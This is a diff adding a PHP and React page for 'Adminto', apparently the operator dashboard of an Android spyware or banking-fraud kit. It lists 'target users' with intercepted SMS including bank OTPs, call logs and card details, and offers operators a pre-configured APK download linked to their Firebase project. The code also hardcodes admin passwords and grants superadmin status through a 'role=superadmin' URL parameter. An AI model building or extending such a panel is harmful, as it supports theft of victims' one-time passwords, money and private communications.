@@ -1,0 +1,518 @@
+<?php
+session_start();
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adminto - Realtime Monitoring Console (PHP Edition)</title>
+  <!-- Google Fonts: Outfit & Inter -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <!-- React & Babel CDNs -->
+  <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
+  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+  <style>
+    :root {
+      --bg-dark: #090d16;
+      --bg-card: rgba(17, 24, 39, 0.75);
+      --border-color: rgba(255, 255, 255, 0.08);
+      --primary: #6366f1;
+      --accent: #ec4899;
+      --text-main: #f9fafb;
+      --text-muted: #9ca3af;
+      --status-active: #10b981;
+      --status-inactive: #ef4444;
+      --font-heading: 'Outfit', sans-serif;
+      --font-body: 'Inter', sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background-color: var(--bg-dark);
+      color: var(--text-main);
+      font-family: var(--font-body);
+      min-height: 100vh;
+      background-image: 
+        radial-gradient(at 0% 0%, rgba(99, 102, 241, 0.15) 0px, transparent 50%),
+        radial-gradient(at 100% 100%, rgba(236, 72, 153, 0.15) 0px, transparent 50%);
+    }
+
+    h1, h2, h3, h4 { font-family: var(--font-heading); }
+
+    .glass-panel {
+      background: var(--bg-card);
+      backdrop-filter: blur(16px);
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+    }
+
+    .app-header {
+      position: sticky; top: 0; z-index: 100;
+      background: rgba(9, 13, 22, 0.85);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border-color);
+      padding: 1rem 2rem;
+    }
+
+    .navbar-content {
+      max-width: 1400px; margin: 0 auto;
+      display: flex; align-items: center; justify-content: space-between; gap: 1.5rem;
+    }
+
+    .brand-logo { display: flex; align-items: center; gap: 12px; }
+    .brand-icon {
+      width: 42px; height: 42px; border-radius: 12px;
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 1.2rem;
+    }
+
+    .search-input {
+      width: 100%; max-width: 450px;
+      padding: 0.65rem 1.2rem;
+      background: rgba(17, 24, 39, 0.6);
+      border: 1px solid var(--border-color);
+      border-radius: 24px; color: #fff; font-size: 0.9rem;
+    }
+
+    .pulse-badge {
+      display: inline-flex; align-items: center; gap: 6px;
+      padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 600;
+    }
+    .pulse-badge.active { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
+    .pulse-badge.inactive { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+    .pulse-dot { width: 8px; height: 8px; border-radius: 50%; background: currentColor; }
+
+    .metrics-grid {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1.25rem; margin-bottom: 2rem;
+    }
+    .metric-card { padding: 1.25rem; display: flex; justify-content: space-between; align-items: center; }
+
+    .user-cards-grid {
+      display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 1.25rem;
+    }
+    .user-card { padding: 1.25rem; cursor: pointer; transition: transform 0.2s; }
+    .user-card:hover { transform: translateY(-3px); border-color: rgba(99, 102, 241, 0.4); }
+
+    .modal-overlay {
+      position: fixed; inset: 0; z-index: 1000;
+      background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(8px);
+      display: flex; align-items: center; justify-content: center; padding: 1.5rem;
+    }
+    .modal-content { width: 100%; max-width: 850px; max-height: 90vh; overflow: hidden; display: flex; flex-direction: column; }
+
+    .tab-btn {
+      padding: 0.6rem 1.2rem; border-radius: 8px; background: transparent; border: none;
+      color: var(--text-muted); font-weight: 500; cursor: pointer;
+    }
+    .tab-btn.active { background: linear-gradient(135deg, var(--primary), var(--accent)); color: #fff; }
+
+    .data-table { width: 100%; border-collapse: collapse; font-size: 0.875rem; text-align: left; }
+    .data-table th, .data-table td { padding: 0.85rem 1rem; border-bottom: 1px solid rgba(255,255,255,0.05); }
+
+    .btn-secondary {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid var(--border-color);
+      color: var(--text-main);
+      padding: 0.5rem 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 0.85rem;
+    }
+    .btn-secondary:hover { background: rgba(255, 255, 255, 0.1); }
+    .btn-primary {
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      color: #fff; border: none; padding: 0.6rem 1.2rem; border-radius: 8px; font-weight: 600; cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div id="root"></div>
+
+  <script type="text/babel">
+    const MOCK_DATA = [
+      {
+        id: "target_001",
+        userId: "USR-9821",
+        fullName: "Vikram Sharma",
+        mobileNumber: "+91 98765 43210",
+        simState: "Active (Jio 5G)",
+        batteryLevel: "88%",
+        isActive: true,
+        lastActivityTime: "Just now",
+        totalSmsCount: 14,
+        totalCallsCount: 6,
+        smsDataList: [
+          { sender: "BANK-OTP", message: "Your OTP for transaction Rs 4,999 is 882190. Do not share.", timestamp: "10:42 AM" },
+          { sender: "HDFC-ALERT", message: "A/c xx9102 debited for INR 1,200.00 at Swiggy.", timestamp: "09:15 AM" }
+        ],
+        callDataList: [
+          { number: "+91 98765 43210", type: "INCOMING", duration: "2m 15s", timestamp: "10:30 AM" },
+          { number: "+91 91234 56789", type: "OUTGOING", duration: "45s", timestamp: "08:20 AM" }
+        ],
+        cardDataList: [
+          { cardNumber: "4532 •••• •••• 8821", cardHolder: "VIKRAM SHARMA", expiry: "08/28", cvv: "•••" }
+        ]
+      },
+      {
+        id: "target_002",
+        userId: "USR-7734",
+        fullName: "Ananya Roy",
+        mobileNumber: "+91 91234 56789",
+        simState: "Active (Airtel)",
+        batteryLevel: "42%",
+        isActive: true,
+        lastActivityTime: "2m ago",
+        totalSmsCount: 9,
+        totalCallsCount: 3,
+        smsDataList: [
+          { sender: "SBI-MSG", message: "Your credit card bill of Rs 12,450 is due on 05-Aug.", timestamp: "Yesterday" }
+        ],
+        callDataList: [],
+        cardDataList: []
+      }
+    ];
+
+    let INITIAL_OPERATORS = [
+      { id: "admin_1", username: "admin", email: "admin@adminto.com", password: "admin123", fullName: "Super Administrator", role: "superadmin", expiryDate: "2099-12-31", firebaseConfig: { projectId: "adminto-superadmin", orgId: "org_all" } },
+      { id: "op_101", username: "operator1", email: "operator1@adminto.com", password: "operator123", fullName: "Regional Operator North", role: "operator", expiryDate: "2026-12-31", firebaseConfig: { projectId: "adminto-north-region", orgId: "org_north" } }
+    ];
+
+    function App() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const isSuperAdminParam = urlParams.get('role') === 'superadmin';
+      const defaultUser = isSuperAdminParam ? INITIAL_OPERATORS[0] : null;
+
+      const [adminUser, setAdminUser] = React.useState(defaultUser);
+      const [operators, setOperators] = React.useState(INITIAL_OPERATORS);
+      const [users, setUsers] = React.useState(MOCK_DATA);
+      const [search, setSearch] = React.useState('');
+      const [selectedUser, setSelectedUser] = React.useState(null);
+      const [tab, setTab] = React.useState('sms');
+      const [showApkModal, setShowApkModal] = React.useState(false);
+
+      const [loginUser, setLoginUser] = React.useState('admin');
+      const [loginPass, setLoginPass] = React.useState('admin123');
+      const [loginError, setLoginError] = React.useState('');
+
+      const handleDownloadApkFile = () => {
+        const proj = adminUser?.firebaseConfig?.projectId || 'adminto-default';
+        window.location.href = `download_apk.php?project=${proj}`;
+      };
+
+      const handleLoginSubmit = async (e) => {
+        e.preventDefault();
+        setLoginError('');
+        const q = loginUser.trim().toLowerCase();
+        const p = loginPass.trim();
+
+        // 1. Attempt PHP MySQL Login API Connection
+        try {
+          const response = await fetch('login.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: q, password: p })
+          });
+          const data = await response.json();
+
+          if (data.success && data.operator) {
+            if (data.operator.role === 'superadmin') {
+              window.location.href = 'superadmin.php?role=superadmin';
+              return;
+            }
+            setAdminUser(data.operator);
+            return;
+          } else if (response.status === 401 || response.status === 403) {
+            setLoginError(data.error || 'Invalid credentials or account expired.');
+            return;
+          }
+        } catch (err) {
+          console.log('PHP login.php endpoint offline, fallback mode.');
+        }
+
+        // 2. Client-side fallback authentication
+        const match = operators.find(acc => 
+          (acc.username.toLowerCase() === q || acc.email.toLowerCase() === q) && acc.password === p
+        );
+
+        if (!match) {
+          setLoginError('Invalid credentials! Username or password incorrect.');
+          return;
+        }
+
+        const todayStr = new Date().toISOString().split('T')[0];
+        if (match.expiryDate && match.expiryDate < todayStr) {
+          setLoginError(`❌ Account Expired on ${match.expiryDate}. Contact Super Admin to extend access.`);
+          return;
+        }
+
+        if (match.role === 'superadmin') {
+          window.location.href = 'superadmin.php';
+          return;
+        }
+
+        setAdminUser(match);
+      };
+
+      const handleLogout = () => {
+        setAdminUser(null);
+        setShowApkModal(false);
+        if (window.history.pushState) {
+          const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
+          window.history.pushState({path: cleanUrl}, '', cleanUrl);
+        }
+      };
+
+      const filtered = users.filter(u => 
+        u.fullName.toLowerCase().includes(search.toLowerCase()) || 
+        u.mobileNumber.includes(search) ||
+        u.userId.toLowerCase().includes(search.toLowerCase())
+      );
+
+      const isSuperAdmin = adminUser?.role === 'superadmin';
+
+      return (
+        <div>
+          {/* Header */}
+          <header className="app-header">
+            <div className="navbar-content">
+              <div className="brand-logo">
+                <div className="brand-icon">🐘</div>
+                <div>
+                  <h3 style={{ color: '#fff', fontSize: '1.2rem' }}>ADMINTO (PHP)</h3>
+                  <div style={{ fontSize: '0.7rem', color: '#6366f1', textTransform: 'uppercase', letterSpacing: '1px' }}>MySQL Powered Dashboard</div>
+                </div>
+              </div>
+
+              <input 
+                type="text" 
+                className="search-input"
+                placeholder="Search Target Users by Name, Phone, or ID..." 
+                value={search}
+                onChange={(e) => setSearch(e.target.value)}
+              />
+
+              <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
+                <div className="pulse-badge active">
+                  <span className="pulse-dot"></span>
+                  <span>{adminUser?.firebaseConfig?.projectId || 'Firebase Live'}</span>
+                </div>
+
+                {adminUser && (
+                  <button 
+                    className="btn-secondary"
+                    onClick={() => setShowApkModal(true)}
+                    style={{ color: '#10b981', border: '1px solid rgba(16,185,129,0.3)' }}
+                  >
+                    📲 Download Custom APK
+                  </button>
+                )}
+
+                {isSuperAdmin && (
+                  <a href="superadmin.php" style={{ textDecoration: 'none' }}>
+                    <button 
+                      className="btn-secondary" 
+                      style={{ color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }}
+                    >
+                      ⚙️ Operator Console (PHP)
+                    </button>
+                  </a>
+                )}
+
+                {adminUser ? (
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                    <span style={{ fontSize: '0.8rem', color: '#9ca3af' }}>
+                      👤 <strong style={{ color: '#fff' }}>{adminUser.username}</strong> ({adminUser.role})
+                    </span>
+                    <button 
+                      className="btn-secondary" 
+                      onClick={handleLogout}
+                      style={{ color: '#f87171', border: '1px solid rgba(239, 68, 68, 0.3)' }}
+                    >
+                      🚪 Logout
+                    </button>
+                  </div>
+                ) : (
+                  <button className="btn-primary" onClick={() => setAdminUser(null)}>
+                    🔑 Sign In
+                  </button>
+                )}
+              </div>
+            </div>
+          </header>
+
+          {/* Main Dashboard */}
+          <main style={{ maxWidth: '1400px', margin: '2rem auto', padding: '0 1.5rem' }}>
+            <div className="metrics-grid">
+              <div className="glass-panel metric-card">
+                <div>
+                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL TARGET USERS</p>
+                  <h2 style={{ color: '#fff' }}>{users.length}</h2>
+                </div>
+                <div style={{ fontSize: '2rem' }}>📱</div>
+              </div>
+              <div className="glass-panel metric-card">
+                <div>
+                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>ACTIVE DEVICES</p>
+                  <h2 style={{ color: '#34d399' }}>{users.filter(u => u.isActive).length}</h2>
+                </div>
+                <div style={{ fontSize: '2rem' }}>⚡</div>
+              </div>
+              <div className="glass-panel metric-card">
+                <div>
+                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL SMS LOGS</p>
+                  <h2 style={{ color: '#818cf8' }}>{users.reduce((acc, u) => acc + u.totalSmsCount, 0)}</h2>
+                </div>
+                <div style={{ fontSize: '2rem' }}>💬</div>
+              </div>
+              <div className="glass-panel metric-card">
+                <div>
+                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL CALL LOGS</p>
+                  <h2 style={{ color: '#f472b6' }}>{users.reduce((acc, u) => acc + u.totalCallsCount, 0)}</h2>
+                </div>
+                <div style={{ fontSize: '2rem' }}>📞</div>
+              </div>
+            </div>
+
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
+              <div>
+                <h2 style={{ fontSize: '1.4rem', color: '#fff' }}>Registered Target Devices</h2>
+                <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>
+                  Active Scope: <code style={{ color: '#93c5fd' }}>{adminUser?.firebaseConfig?.projectId || 'Default Project'}</code>
+                </p>
+              </div>
+            </div>
+
+            <div className="user-cards-grid">
+              {filtered.map(u => (
+                <div key={u.id} className="glass-panel user-card" onClick={() => setSelectedUser(u)}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.75rem' }}>
+                    <div>
+                      <h4 style={{ color: '#fff', fontSize: '1.1rem' }}>{u.fullName}</h4>
+                      <p style={{ fontSize: '0.8rem', color: '#6366f1' }}>ID: {u.userId}</p>
+                    </div>
+                    <span className={`pulse-badge ${u.isActive ? 'active' : 'inactive'}`}>
+                      <span className="pulse-dot"></span>
+                      {u.isActive ? 'ACTIVE' : 'OFFLINE'}
+                    </span>
+                  </div>
+
+                  <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '4px', marginBottom: '1rem' }}>
+                    <div>📞 <strong>{u.mobileNumber}</strong></div>
+                    <div>📶 SIM: {u.simState} • 🔋 Battery: {u.batteryLevel}</div>
+                    <div>🕒 Last Active: {u.lastActivityTime}</div>
+                  </div>
+
+                  <div style={{ display: 'flex', gap: '8px', paddingTop: '0.75rem', borderTop: '1px solid rgba(255,255,255,0.08)', fontSize: '0.8rem' }}>
+                    <span className="pulse-badge" style={{ background: 'rgba(99,102,241,0.15)', color: '#818cf8' }}>
+                      💬 {u.totalSmsCount} SMS
+                    </span>
+                    <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6' }}>
+                      📞 {u.totalCallsCount} Calls
+                    </span>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </main>
+
+          {/* Download Operator APK Modal Overlay */}
+          {showApkModal && (
+            <div className="modal-overlay">
+              <div className="glass-panel modal-content" style={{ maxWidth: '640px' }}>
+                <div style={{ padding: '1.25rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                  <div>
+                    <h3 style={{ color: '#fff' }}>📲 Download Custom Operator APK (PHP)</h3>
+                    <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Pre-configured Android App linked directly to your database</p>
+                  </div>
+                  <button onClick={() => setShowApkModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
+                </div>
+
+                <div style={{ padding: '1.5rem', overflowY: 'auto', flex: 1, display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
+                  <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(16,185,129,0.3)', background: 'rgba(16,185,129,0.05)' }}>
+                    <h4 style={{ color: '#34d399', fontSize: '0.9rem', marginBottom: '8px' }}>🛡️ Embedded Operator Credentials</h4>
+                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem', fontSize: '0.8rem' }}>
+                      <div><span style={{ color: '#9ca3af' }}>Operator:</span> <strong style={{ color: '#fff' }}>{adminUser?.username}</strong></div>
+                      <div><span style={{ color: '#9ca3af' }}>Firebase Project ID:</span> <code style={{ color: '#93c5fd' }}>{adminUser?.firebaseConfig?.projectId || 'adminto-default'}</code></div>
+                      <div><span style={{ color: '#9ca3af' }}>Organization Scope:</span> <code style={{ color: '#c084fc' }}>{adminUser?.firebaseConfig?.orgId || 'org_main'}</code></div>
+                      <div><span style={{ color: '#9ca3af' }}>Status:</span> <span style={{ color: '#34d399', fontWeight: 600 }}>✓ Verified</span></div>
+                    </div>
+                  </div>
+
+                  <div>
+                    <button type="button" className="btn-primary" onClick={handleDownloadApkFile} style={{ background: 'linear-gradient(135deg, #10b981, #059669)', width: '100%', justifyContent: 'center', padding: '0.9rem', fontSize: '1rem' }}>
+                      📥 Download Official Android APK (12.2 MB)
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Login Modal Overlay if not logged in */}
+          {!adminUser && (
+            <div className="modal-overlay">
+              <div className="glass-panel" style={{ width: '100%', maxWidth: '420px', padding: '2.5rem 2rem' }}>
+                <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
+                  <div className="brand-icon" style={{ margin: '0 auto 1rem', width: '56px', height: '56px', borderRadius: '16px' }}>🛡️</div>
+                  <h2 style={{ fontSize: '1.6rem', color: '#fff', marginBottom: '4px' }}>Adminto PHP Portal</h2>
+                  <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>MySQL Database Authenticated SaaS</p>
+                </div>
+
+                {loginError && (
+                  <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1.25rem', textAlign: 'center' }}>
+                    {loginError}
+                  </div>
+                )}
+
+                <form onSubmit={handleLoginSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
+                  <div>
+                    <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Username or Email</label>
+                    <input 
+                      type="text" 
+                      className="search-input" 
+                      style={{ maxWidth: '100%', paddingLeft: '1rem' }}
+                      value={loginUser}
+                      onChange={(e) => setLoginUser(e.target.value)}
+                      placeholder="admin"
+                    />
+                  </div>
+
+                  <div>
+                    <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Password</label>
+                    <input 
+                      type="password" 
+                      className="search-input" 
+                      style={{ maxWidth: '100%', paddingLeft: '1rem' }}
+                      value={loginPass}
+                      onChange={(e) => setLoginPass(e.target.value)}
+                      placeholder="••••••••"
+                    />
+                  </div>
+
+                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.75rem' }}>
+                    Sign In (MySQL PHP)
+                  </button>
+                </form>
+
+                <div style={{ marginTop: '1.5rem', paddingTop: '1rem', borderTop: '1px solid rgba(255,255,255,0.08)', fontSize: '0.75rem', color: '#9ca3af', textAlign: 'center' }}>
+                  <div>Try active operator: <code style={{ color: '#93c5fd' }}>operator1 / operator123</code></div>
+                  <div style={{ marginTop: '4px' }}>Try Super Admin: <code style={{ color: '#ec4899' }}>admin / admin123</code></div>
+                </div>
+              </div>
+            </div>
+          )}
+        </div>
+      );
+    }
+
+    ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+  </script>
+</body>
+</html>
